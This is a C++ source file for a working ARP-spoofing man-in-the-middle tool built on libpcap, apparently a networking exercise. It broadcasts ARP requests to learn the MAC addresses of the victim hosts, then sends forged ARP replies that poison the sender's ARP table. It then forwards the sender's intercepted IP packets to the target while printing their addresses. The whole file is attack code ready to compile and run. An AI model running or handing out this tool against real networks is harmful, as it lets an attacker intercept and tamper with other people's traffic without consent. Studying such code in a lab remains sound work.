#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <libnet.h>
#include<string>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"
#include "atinfo.h"
#include "mac.h"
#include "ip.h"
using namespace std;
#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)
void printIp(Ip ip) {
	int a;
	memcpy(&a, &ip, sizeof(Ip));
	printf("%d.%d.%d.%d\n", ((a&0xff)), ((a&0xff00)>>8), ((a&0xff0000)>>16), ((a&0xff000000)>>24));
}
void printMac(Mac mac) {
	uint8_t a[6];
	memcpy(a, &mac, sizeof(Mac));
	for(int i = 0 ; i < 6 ; i++) {
		printf("%02x", a[i]);
		if(i < 5)
			printf(":");
	}
	printf("\n");
}
void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}
int Arp_spoofing(pcap_t* handle,Mac atkmac,Ip atkIp,Mac sndmac,Ip sndIp,Ip tgtIp){
	EthArpPacket packet;
	memcpy(&packet.eth_.dmac_,&sndmac,sizeof(Mac));
	memcpy(&packet.eth_.smac_,&atkmac,sizeof(Mac));
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	memcpy(&packet.arp_.smac_,&atkmac,sizeof(Mac));
	memcpy(&packet.arp_.sip_,&tgtIp,sizeof(Ip));
	memcpy(&packet.arp_.tmac_,&sndmac,sizeof(Mac));
	memcpy(&packet.arp_.tip_,&sndIp,sizeof(Ip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return 0;
}
int Request_arp_packet(pcap_t* handle,char* dev,Mac atkmac,Ip atkIp,Ip sender_ip){
	EthArpPacket packet;
	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	memcpy(&packet.eth_.smac_,&atkmac,sizeof(Mac));
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	memcpy(&packet.arp_.smac_,&atkmac,sizeof(Mac));
	memcpy(&packet.arp_.sip_,&atkIp,sizeof(Ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	memcpy(&packet.arp_.tip_,&sender_ip,sizeof(Ip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return 0;
}

int main(int argc, char* argv[]) {

	if (argc < 4 || (argc%2)!=0) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	char **sender=(char**)malloc(sizeof(char*)*(argc/2-1));
	char **target_ip=(char**)malloc(sizeof(char*)*(argc/2-1));
	Mac *target_Mac=(Mac*)malloc(sizeof(Mac)*(argc/2-1));
	int j=0;
	for(int i=2;i<argc;i+=2){
		sender[j]=argv[i];
		//std::cout<<sender[j]<<'\n';
		j++;
	}
	int k=0;
	for (int i=3;i<argc;i+=2){
		target_ip[k]=argv[i];
		//std::cout<<target_ip[k]<<'\n';
		k++;
	}
	Mac atkmac;
	getAtkMac(&atkmac);
	//printMac(atkmac);
	Ip atkIp;
	getAtkIp(&atkIp,dev);
	//printIp(atkIp);
	int i=0;
	for(i=0;i<(argc/2)-1;i++){
		//Ip sndip=htonl(*sender[i]);
		//std::cout << (sender[i])<<'\n' ;
		Ip sndip=htonl(Ip(sender[i]));
		Request_arp_packet(handle,dev,atkmac,atkIp,sndip);
	}
	for(i=0;i<(argc/2)-1;i++){
		//Ip tgtip=htonl(*target[i]);
		//printf("%s\n",target_ip[i]);
		Ip tgtip=htonl(Ip(target_ip[i]));
		Request_arp_packet(handle,dev,atkmac,atkIp,tgtip);
	}
	EthArpPacket *reply_packet;
	int flag=0;
	struct libnet_ipv4_hdr *re_ip;
	printf("%d\n",argc);
	while(1){
		struct pcap_pkthdr* header;
		const u_char* repacket=nullptr;
		int res1= pcap_next_ex(handle,&header,&repacket);
		if (res1 == 0) continue;
        if (res1 == -1 || res1== -2) {
            printf("pcap_next_ex return %d(%s)\n", res1, pcap_geterr(handle));
            break;
		}
		re_ip= (struct libnet_ipv4_hdr*)(repacket+14);
		reply_packet=(EthArpPacket*)repacket;
		//check broadcast and sender reply
		if(reply_packet->eth_.type_ ==(0x0608)){
			for(int i=0;i<argc/2-1;i++){
				Ip sndip=htonl(Ip(sender[i]));
				Ip tgtip=htonl(Ip(target_ip[i]));
				if((reply_packet->arp_.sip_==sndip)){
					Mac senderMac=reply_packet->eth_.smac_;				
					Arp_spoofing(handle,atkmac,atkIp,senderMac,sndip,tgtip);
				}
				if(reply_packet->arp_.sip_==tgtip){
					Mac targetMac=reply_packet->eth_.smac_;
					target_Mac[i]=targetMac;
				}
			}
		}
		//relay ip packet from sender to target
		if(reply_packet->eth_.type_==(0x0008)){
			for(int i=0;i<argc/2-1;i++){
				Ip sndip=htonl(Ip(sender[i]));
				Ip tgtip=htonl(Ip(target_ip[i]));
				if(strcmp(inet_ntoa(re_ip->ip_src),sender[i])==0){
					printf("src ip:: %s\n",sender[i]);
					printf("dst ip:: %s\n", inet_ntoa(re_ip->ip_dst));
					memcpy(reply_packet->eth_.dmac_,&target_Mac[i],sizeof(Mac));
					memcpy(reply_packet->eth_.smac_,&atkmac,sizeof(Mac));
					printf("target MAC:: ");
					printMac(target_Mac[i]);
					printf("target ip:: %s\n",target_ip[i]);
					printf("-----------------------------------------------\n");
					int res3 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(reply_packet), header->caplen);
				}
			}
		}
	}
	pcap_close(handle);
	return 0;
}
//get sender MAC 
// spoof sender arp table
//when sender give ip packet to attaker
//relay to target
